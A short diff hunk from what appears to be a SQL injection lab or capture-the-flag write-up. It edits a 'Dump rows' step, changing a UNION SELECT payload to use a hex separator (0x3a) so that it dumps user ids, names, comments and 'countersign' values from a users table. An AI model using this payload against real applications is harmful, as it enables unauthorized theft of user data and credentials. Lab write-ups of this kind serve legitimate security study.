@@ -64,7 +64,7 @@ user_id,first_name,last_name,town,country,planet,Commentaire,countersign
 6. **Dump rows** (compact, per row)
 
 ```
--1 UNION SELECT 1,CONCAT_WS(':',user_id,first_name,last_name,Commentaire,countersign) FROM users --
+-1 UNION SELECT 1,CONCAT_WS(0x3a,user_id,first_name,last_name,Commentaire,countersign) FROM users --
 ```
 
 **Observed sample:**
